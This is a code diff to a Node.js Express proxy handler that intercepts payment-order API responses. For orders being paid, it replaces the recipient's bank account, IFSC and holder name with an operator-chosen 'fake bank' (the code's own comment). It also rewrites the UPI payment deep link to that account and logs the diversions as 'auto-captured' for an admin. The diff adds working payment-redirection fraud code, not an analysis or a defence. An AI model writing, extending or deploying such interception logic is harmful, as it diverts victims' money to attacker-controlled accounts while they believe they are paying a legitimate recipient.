@@ -1579,27 +1579,32 @@ app.all('/xxapi/*', async (req, res) => {
         const activeBank = getActiveBank(data, null);
         
         if (activeBank && data.botEnabled !== false) {
-          let capturedCount = 0;
           for (const order of orderList) {
             const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
             const amt = getOrderAmount(req, order);
             const orderId = order.orderNo || order.rptNo || order.id || order.orderId || '';
+            const altId = order.rptNo || '';
             
             if (isPaying && orderId && amt !== null) {
               if (!activeBank.minAmount || amt >= activeBank.minAmount) {
+                // Mutate the JSON response directly so the app sees the fake bank
+                const bkAcctC1 = activeBank.accountNo || '';
+                const bkIfscC1 = activeBank.ifsc || '';
+                const bkNameC1 = activeBank.accountHolder || '';
+                const last4C1 = bkAcctC1.slice(-4);
+                let pt = order.payType || order.ctType || 1;
+                if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
+                const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
+                
+                const hasBank = scanHasBankFields(order, 0);
+                if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
+                
+                if (wDomC1) order.walletDomain = wDomC1;
+                if (activeBank.bankName) order.bankName = activeBank.bankName;
+
                 if (!data.orderBankMap) data.orderBankMap = {};
-                if (!data.orderBankMap[String(orderId)]) {
-                  const bkAcctC1 = activeBank.accountNo;
-                  const bkIfscC1 = activeBank.ifsc;
-                  const bkNameC1 = activeBank.accountHolder;
-                  const last4C1 = bkAcctC1.slice(-4);
-                  
-                  let pt = order.payType || order.ctType || 1;
-                  if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
-                  
-                  const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
-                  
-                  data.orderBankMap[String(orderId)] = {
+                if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
+                  const savedData = {
                     bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
                     accountHolder: bkNameC1,
                     accountNo: bkAcctC1,
@@ -1607,7 +1612,7 @@ app.all('/xxapi/*', async (req, res) => {
                     bankName: activeBank.bankName || '',
                     upiId: activeBank.upiId || '',
                     amount: amt,
-                    rptNo: orderId,
+                    rptNo: altId || orderId,
                     orderNo: orderId,
                     walletDomain: wDomC1,
                     payType: pt,
@@ -1616,6 +1621,11 @@ app.all('/xxapi/*', async (req, res) => {
                     forced: true,
                     isManual: true
                   };
+                  
+                  data.orderBankMap[String(orderId)] = savedData;
+                  if (altId && altId !== orderId) {
+                      data.orderBankMap[String(altId)] = savedData;
+                  }
                   
                   notifyAdmin(data,
                     `✅ AUTO-CAPTURED FROM HISTORY
